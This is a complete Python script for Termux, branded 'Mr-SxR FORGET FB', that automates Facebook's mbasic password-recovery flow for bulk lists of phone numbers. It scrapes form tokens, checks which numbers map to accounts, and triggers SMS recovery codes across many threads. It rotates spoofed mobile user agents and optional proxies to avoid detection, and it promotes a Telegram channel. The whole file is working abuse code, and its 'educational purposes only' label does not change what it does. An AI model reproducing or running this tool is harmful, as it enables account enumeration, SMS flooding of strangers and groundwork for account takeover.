#!/data/data/com.termux/files/usr/bin/python3
# -*- coding: utf-8 -*-
import os
import sys
import time
import json
import random
import threading
import hashlib
import base64
import re
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor

# Fix encoding for Termux
sys.stdout.reconfigure(encoding='utf-8') if hasattr(sys.stdout, 'reconfigure') else None
os.system('clear')

# Color codes for Termux
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    RESET = '\033[0m'
    BOLD = '\033[1m'

# Simple aliases
R = Colors.RED
G = Colors.GREEN
Y = Colors.YELLOW
B = Colors.BLUE
M = Colors.MAGENTA
C = Colors.CYAN
W = Colors.WHITE
X = Colors.RESET
BO = Colors.BOLD

# Global counters
total_checked = 0
total_success = 0
total_failed = 0
total_error = 0
print_lock = threading.Lock()
counter_lock = threading.Lock()

LINE = f"{C}•━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━•{X}"

def clear_screen():
    os.system('clear')

def print_logo():
    clear_screen()
    logo = f"""
{G}{BO}
      .d8888.  db    db  d8888b. 
      88'  YP  `8b  d8'  88  `8D 
      `8bo.     `8bd8'   88oobY' 
        `Y8b.   .dPYb.   88`8b   
      db   8D  .8P  Y8.  88 `88. 
      `8888Y'  YP    YP  88   YD   {Y}V-3.6 (Termux){X}
{LINE}
 {G}[{R}●{G}] TOOL OWNER   {C}: {G}@yeasin_hossain018
 {G}[{R}●{G}] TOOL         {C}: {G}FORGET FB
 {G}[{R}●{G}] TOOL STATUS  {C}: {G}FREE VERSION
{LINE}
"""
    print(logo)

def load_numbers():
    """Load phone numbers from file"""
    files = [f for f in os.listdir('.') if f.endswith('.txt')]
    
    if not files:
        print(f"{R}No text files found!")
        print(f"{Y}Create a file named 'numbers.txt' with phone numbers (one per line)")
        print(f"\n{Y}Example numbers.txt content:")
        print(f"{W}8801234567890")
        print(f"{W}8809876543210")
        print(f"{W}8801122334455{X}")
        return []
    
    # Check for specific files first
    preferred_files = ['numbers.txt', 'phone.txt', 'list.txt', 'Number_List.txt']
    
    for filename in preferred_files:
        if os.path.exists(filename):
            try:
                with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
                    numbers = []
                    for line in f:
                        line = line.strip()
                        if line:
                            # Extract numbers from line
                            line_numbers = re.findall(r'\d{7,15}', line)
                            numbers.extend(line_numbers)
                    
                if numbers:
                    print(f"{G}[{R}●{G}] Loaded {len(numbers)} numbers from {filename}")
                    return numbers
                else:
                    print(f"{R}No valid numbers found in {filename}")
                    return []
            except Exception as e:
                print(f"{R}Error reading {filename}: {e}")
    
    # If no preferred file found, show available files
    print(f"{Y}Available files:")
    for i, f in enumerate(files, 1):
        print(f"  {G}[{R}{i}{G}] {W}{f}")
    
    try:
        choice = int(input(f"\n{Y}Select file (1-{len(files)}): {W}"))
        if 1 <= choice <= len(files):
            filename = files[choice-1]
            with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
                numbers = []
                for line in f:
                    line = line.strip()
                    if line:
                        line_numbers = re.findall(r'\d{7,15}', line)
                        numbers.extend(line_numbers)
                
            if numbers:
                print(f"{G}[{R}●{G}] Loaded {len(numbers)} numbers from {filename}")
                return numbers
            else:
                print(f"{R}No valid numbers found in {filename}")
                return []
    except:
        print(f"{R}Invalid selection!")
    
    return []

def get_proxy_config():
    """Get proxy configuration"""
    print(f"\n{Y}Proxy Configuration:")
    print(f"  {G}[{R}1{G}] No proxy (direct connection)")
    print(f"  {G}[{R}2{G}] Use proxy")
    
    try:
        choice = int(input(f"\n{Y}Select option (1-2): {W}"))
        
        if choice == 1:
            return None
        elif choice == 2:
            proxy_input = input(f"{Y}Enter proxy (ip:port or user:pass@ip:port): {W}").strip()
            
            if proxy_input:
                # Parse proxy
                if '@' in proxy_input:
                    # Has authentication
                    auth, server = proxy_input.split('@')
                    user, password = auth.split(':')
                    ip, port = server.split(':')
                    proxy_url = f"http://{user}:{password}@{ip}:{port}"
                else:
                    # No authentication
                    ip, port = proxy_input.split(':')
                    proxy_url = f"http://{ip}:{port}"
                
                return {
                    'http': proxy_url,
                    'https': proxy_url
                }
    except:
        pass
    
    return None

def get_browser_choice():
    """Get browser/user-agent choice"""
    browsers = {
        '1': 'Chrome Mobile',
        '2': 'Firefox Mobile',
        '3': 'Samsung Browser',
        '4': 'Opera Mobile',
        '5': 'UC Browser',
        '6': 'Random'
    }
    
    print(f"\n{Y}Select Browser:")
    for key, value in browsers.items():
        print(f"  {G}[{R}{key}{G}] {W}{value}")
    
    choice = input(f"\n{Y}Select browser (1-6, default 1): {W}").strip()
    return browsers.get(choice, 'Chrome Mobile')

def get_thread_count():
    """Get thread count"""
    try:
        threads = input(f"{Y}Enter number of threads (1-50, default 10): {W}").strip()
        if threads:
            threads = int(threads)
            if 1 <= threads <= 50:
                return threads
    except:
        pass
    return 10

def update_counter(status, number=None, message=None):
    """Update counters and display status"""
    global total_checked, total_success, total_failed, total_error
    
    with counter_lock:
        if status == 'success':
            total_success += 1
        elif status == 'failed':
            total_failed += 1
        elif status == 'error':
            total_error += 1
        
        total_checked += 1
    
    # Display status
    with print_lock:
        status_line = f"\r{G}[{W}Mr-SxR{G}] {W}CHECKED:{total_checked}{C}|{G}OK:{total_success}{C}|{Y}FAIL:{total_failed}{C}|{R}ERR:{total_error}{X}"
        sys.stdout.write(status_line + ' ' * 20)
        
        if message and number:
            print(f"\n{W}[{G}+{W}] {message}: {number}")
        elif message:
            print(f"\n{W}[{G}+{W}] {message}")
        
        sys.stdout.flush()

def generate_user_agent(browser_type):
    """Generate random user agent"""
    android_versions = [
        '10.0', '10', '9.0', '9', '8.1.0', '8.0', '7.1.1', '7.0', 
        '6.0.1', '6.0', '5.1.1', '5.1', '5.0.2', '5.0'
    ]
    
    devices = [
        'SM-G950F', 'SM-G955F', 'SM-G960F', 'SM-G965F',  # Samsung Galaxy
        'SM-G970F', 'SM-G973F', 'SM-G975F', 'SM-G980F',  # Samsung Galaxy
        'SM-N950F', 'SM-N960F', 'SM-N970F', 'SM-N975F',  # Samsung Note
        'Pixel 3', 'Pixel 3 XL', 'Pixel 4', 'Pixel 4 XL',  # Google Pixel
        'Pixel 5', 'Pixel 6', 'Pixel 7',  # Google Pixel
        'Mi 9T', 'Mi 10', 'Mi 11', 'Redmi Note 8', 'Redmi Note 9',  # Xiaomi
        'OnePlus 6', 'OnePlus 7', 'OnePlus 8', 'OnePlus 9',  # OnePlus
        'LG G7', 'LG V40', 'LG V50',  # LG
        'Xperia 1', 'Xperia 5', 'Xperia 10'  # Sony
    ]
    
    android_ver = random.choice(android_versions)
    device = random.choice(devices)
    
    if browser_type == 'Chrome Mobile' or browser_type == 'Random':
        chrome_ver = f"{random.randint(80, 105)}.0.{random.randint(1000, 5000)}.{random.randint(50, 200)}"
        return f"Mozilla/5.0 (Linux; Android {android_ver}; {device}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_ver} Mobile Safari/537.36"
    
    elif browser_type == 'Firefox Mobile':
        firefox_ver = f"{random.randint(80, 105)}.0"
        return f"Mozilla/5.0 (Android {android_ver}; Mobile; rv:{firefox_ver}) Gecko/{firefox_ver} Firefox/{firefox_ver}"
    
    elif browser_type == 'Samsung Browser':
        samsung_ver = f"{random.randint(10, 18)}.0"
        chrome_ver = f"{random.randint(80, 105)}.0.{random.randint(1000, 5000)}.{random.randint(50, 200)}"
        return f"Mozilla/5.0 (Linux; Android {android_ver}; {device}) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/{samsung_ver} Chrome/{chrome_ver} Mobile Safari/537.36"
    
    elif browser_type == 'Opera Mobile':
        opera_ver = f"{random.randint(60, 80)}.0.{random.randint(1000, 4000)}"
        return f"Mozilla/5.0 (Linux; Android {android_ver}; {device}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(80, 105)}.0.{random.randint(1000, 5000)}.{random.randint(50, 200)} Mobile Safari/537.36 OPR/{opera_ver}"
    
    elif browser_type == 'UC Browser':
        uc_ver = f"{random.randint(12, 15)}.{random.randint(0, 9)}.{random.randint(1000, 4000)}"
        return f"Mozilla/5.0 (Linux; U; Android {android_ver}; {device}) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 UCBrowser/{uc_ver}"
    
    # Default to Chrome
    chrome_ver = f"{random.randint(80, 105)}.0.{random.randint(1000, 5000)}.{random.randint(50, 200)}"
    return f"Mozilla/5.0 (Linux; Android {android_ver}; {device}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_ver} Mobile Safari/537.36"

def check_number(number, proxy=None, browser_type='Chrome Mobile'):
    """Check and process a single number"""
    try:
        import requests
        from requests.exceptions import RequestException
        
        # Create session
        session = requests.Session()
        if proxy:
            session.proxies.update(proxy)
        
        # Generate headers
        user_agent = generate_user_agent(browser_type)
        headers = {
            'User-Agent': user_agent,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1',
            'Cache-Control': 'max-age=0'
        }
        
        # Use mbasic.facebook.com for better compatibility
        server = 'mbasic.facebook.com'
        
        # Step 1: Initial request
        url = f"https://{server}/login/identify/?ctx=recover&ars=facebook_login"
        response = session.get(url, headers=headers, timeout=15)
        
        if response.status_code != 200:
            update_counter('error', number, f"HTTP {response.status_code}")
            return
        
        # Extract lsd and jazoest tokens
        text = response.text
        
        lsd_match = re.search(r'name="lsd"\s*value="([^"]+)"', text)
        jazoest_match = re.search(r'name="jazoest"\s*value="([^"]+)"', text)
        
        if not lsd_match or not jazoest_match:
            update_counter('error', number, "No tokens found")
            return
        
        lsd = lsd_match.group(1)
        jazoest = jazoest_match.group(1)
        
        # Step 2: Search for number
        search_url = f"https://{server}/login/identify/?ctx=recover&c=%2Flogin%2F&search_attempts=1&ars=facebook_login"
        data = {
            'lsd': lsd,
            'jazoest': jazoest,
            'email': number,
            'did_submit': 'Search'
        }
        
        headers['Content-Type'] = 'application/x-www-form-urlencoded'
        headers['Origin'] = f'https://{server}'
        headers['Referer'] = url
        
        response = session.post(search_url, data=data, headers=headers, timeout=15)
        
        if response.status_code != 200:
            update_counter('error', number, f"Search failed: HTTP {response.status_code}")
            return
        
        text = response.text
        
        # Check for errors
        if 'id="login_identify_search_error_msg"' in text:
            update_counter('failed', number, "Account not found")
            return
        
        # Check for multiple accounts
        if 'action="/login/identify/?ctx=recover' in text:
            update_counter('failed', number, "Multiple accounts found")
            return
        
        # Look for SMS option
        if 'send_sms:' in text:
            # Try to find SMS option
            sms_matches = re.findall(r'value="(send_sms:[^"]+)"', text)
            
            if sms_matches:
                # Get new tokens for SMS request
                lsd_match = re.search(r'name="lsd"\s*value="([^"]+)"', text)
                jazoest_match = re.search(r'name="jazoest"\s*value="([^"]+)"', text)
                
                if lsd_match and jazoest_match:
                    lsd = lsd_match.group(1)
                    jazoest = jazoest_match.group(1)
                    
                    # Find form action
                    action_match = re.search(r'action="([^"]+)"', text)
                    if action_match:
                        action = action_match.group(1).replace('&amp;', '&')
                        
                        # Send SMS request
                        sms_data = {
                            'lsd': lsd,
                            'jazoest': jazoest,
                            'recover_method': sms_matches[0],
                            'reset_action': 'Continue'
                        }
                        
                        sms_url = f"https://{server}{action}"
                        response = session.post(sms_url, data=sms_data, headers=headers, timeout=15)
                        
                        if 'action="/recover/code/' in response.text:
                            update_counter('success', number, "SMS sent successfully")
                            return
                        else:
                            update_counter('failed', number, "SMS send failed")
                            return
        
        update_counter('failed', number, "No SMS option available")
        
    except RequestException as e:
        update_counter('error', number, f"Network error: {str(e)[:50]}")
    except Exception as e:
        update_counter('error', number, f"Error: {str(e)[:50]}")

def main_automation():
    """Main automation function"""
    global total_checked, total_success, total_failed, total_error
    
    # Reset counters
    total_checked = 0
    total_success = 0
    total_failed = 0
    total_error = 0
    
    # Load numbers
    numbers = load_numbers()
    if not numbers:
        input(f"\n{R}No numbers found! Press Enter to continue...{X}")
        return
    
    print(f"\n{G}[{R}●{G}] Found {W}{len(numbers)}{G} numbers")
    
    # Get configuration
    proxy = get_proxy_config()
    browser_type = get_browser_choice()
    thread_count = get_thread_count()
    
    print(f"\n{G}[{R}●{G}] Starting with {W}{thread_count}{G} threads")
    print(f"{G}[{R}●{G}] Browser: {W}{browser_type}")
    print(f"{G}[{R}●{G}] Proxy: {W}{'Yes' if proxy else 'No'}")
    print(f"{LINE}")
    
    input(f"\n{Y}Press Enter to start...{X}")
    
    # Clear screen and show progress
    clear_screen()
    print_logo()
    print(f"\n{G}[{R}●{G}] Processing {W}{len(numbers)}{G} numbers...\n")
    
    # Start processing
    try:
        with ThreadPoolExecutor(max_workers=thread_count) as executor:
            # Submit all numbers
            futures = []
            for number in numbers:
                future = executor.submit(check_number, number, proxy, browser_type)
                futures.append(future)
            
            # Wait for completion
            for future in futures:
                future.result()
                
    except KeyboardInterrupt:
        print(f"\n\n{R}Process interrupted by user!{X}")
    except Exception as e:
        print(f"\n\n{R}Error in processing: {e}{X}")
    
    # Show final results
    print(f"\n{LINE}")
    print(f"{G}[{R}●{G}] Total Checked: {W}{total_checked}")
    print(f"{G}[{R}●{G}] Successful: {G}{total_success}")
    print(f"{G}[{R}●{G}] Failed: {Y}{total_failed}")
    print(f"{G}[{R}●{G}] Errors: {R}{total_error}")
    print(f"{LINE}")
    
    input(f"\n{Y}Press Enter to continue...{X}")

def create_numbers_file():
    """Create a numbers file"""
    clear_screen()
    print(f"{G}Create Numbers File")
    print(f"{LINE}")
    
    filename = input(f"{Y}Enter filename (default: numbers.txt): {W}").strip()
    if not filename:
        filename = "numbers.txt"
    
    print(f"\n{Y}Enter phone numbers (one per line)")
    print(f"{Y}Type 'done' when finished:{X}\n")
    
    numbers = []
    count = 1
    while True:
        num = input(f"{C}[{count}] {W}").strip()
        if num.lower() == 'done':
            break
        
        # Clean number
        clean_num = re.sub(r'\D', '', num)
        if 7 <= len(clean_num) <= 15:
            numbers.append(clean_num)
            count += 1
        else:
            print(f"{R}Invalid number: {num}{X}")
    
    if numbers:
        try:
            with open(filename, 'w') as f:
                for num in numbers:
                    f.write(num + '\n')
            
            print(f"\n{G}Saved {len(numbers)} numbers to {filename}{X}")
        except Exception as e:
            print(f"\n{R}Error saving file: {e}{X}")
    else:
        print(f"\n{R}No numbers saved!{X}")
    
    input(f"\n{Y}Press Enter to continue...{X}")

def check_single_number():
    """Check a single number"""
    clear_screen()
    print(f"{G}Check Single Number")
    print(f"{LINE}")
    
    number = input(f"{Y}Enter phone number: {W}").strip()
    
    if not number:
        print(f"{R}No number entered!{X}")
        time.sleep(2)
        return
    
    # Clean number
    clean_num = re.sub(r'\D', '', number)
    if not (7 <= len(clean_num) <= 15):
        print(f"{R}Invalid phone number!{X}")
        time.sleep(2)
        return
    
    print(f"\n{Y}Checking number: {W}{clean_num}")
    print(f"{Y}Please wait...{X}")
    
    # Simple check
    check_number(clean_num, None, 'Chrome Mobile')
    
    input(f"\n{Y}Press Enter to continue...{X}")

def join_telegram():
    """Open Telegram channel"""
    clear_screen()
    print(f"{G}Join Telegram Channel")
    print(f"{LINE}")
    print(f"\n{G}Telegram Channel: {W}@mrsxrtools")
    print(f"{G}Owner: {W}@yeasin_hossain018")
    print(f"{LINE}")
    
    try:
        import webbrowser
        webbrowser.open('https://t.me/mrsxrtools')
    except:
        print(f"\n{Y}Please open: https://t.me/mrsxrtools{X}")
    
    input(f"\n{Y}Press Enter to continue...{X}")

def show_about():
    """Show about information"""
    clear_screen()
    print(f"{G}About Mr-SxR Forget FB Tool")
    print(f"{LINE}")
    print(f"\n{G}Version:{W} 3.6 (Termux)")
    print(f"{G}Author:{W} Mr-SxR")
    print(f"{G}Contact:{W} @yeasin_hossain018")
    print(f"{G}Channel:{W} @mrsxrtools")
    print(f"\n{Y}Description:{X}")
    print(f"{W}This tool helps to send SMS recovery codes to")
    print(f"{W}Facebook accounts using phone number recovery.")
    print(f"\n{Y}Note:{R} For educational purposes only!{X}")
    print(f"{LINE}")
    
    input(f"\n{Y}Press Enter to continue...{X}")

def main_menu():
    """Main menu"""
    while True:
        print_logo()
        print(f"{LINE}")
        print(f" {G}[{R}01{G}] Start FB Forget")
        print(f" {G}[{R}02{G}] Create Numbers File")
        print(f" {G}[{R}03{G}] Check Single Number")
        print(f" {G}[{R}04{G}] Join Telegram Channel")
        print(f" {G}[{R}05{G}] About")
        print(f" {G}[{R}00{G}] Exit")
        print(f"{LINE}")
        
        choice = input(f"\n{G}[{R}●{G}] Select option: {W}").strip()
        
        if choice in ['1', '01']:
            main_automation()
        elif choice in ['2', '02']:
            create_numbers_file()
        elif choice in ['3', '03']:
            check_single_number()
        elif choice in ['4', '04']:
            join_telegram()
        elif choice in ['5', '05']:
            show_about()
        elif choice in ['0', '00']:
            print(f"\n{G}Thank you for using Mr-SxR Tools!{X}")
            time.sleep(2)
            sys.exit()
        else:
            print(f"\n{R}Invalid option!{X}")
            time.sleep(2)

def main():
    """Main function"""
    try:
        # Check if requests is installed
        try:
            import requests
        except ImportError:
            print(f"{R}Installing required packages...{X}")
            try:
                import subprocess
                subprocess.check_call([sys.executable, "-m", "pip", "install", "requests"])
                print(f"{G}Installation complete! Restarting...{X}")
                time.sleep(2)
                os.execv(sys.executable, [sys.executable] + sys.argv)
            except:
                print(f"{R}Failed to install packages!{X}")
                print(f"{Y}Please run: pip install requests{X}")
                sys.exit(1)
        
        # Show welcome message
        print_logo()
        print(f"{G}Welcome to Mr-SxR Forget FB Tool (Termux Version)")
        print(f"{Y}Press Enter to continue...{X}")
        input()
        
        # Show main menu
        main_menu()
            
    except KeyboardInterrupt:
        print(f"\n\n{R}Program interrupted!{X}")
        sys.exit()
    except Exception as e:
        print(f"\n{R}Error: {e}{X}")
        import traceback
        traceback.print_exc()
        input(f"\n{Y}Press Enter to exit...{X}")

if __name__ == "__main__":
    main()
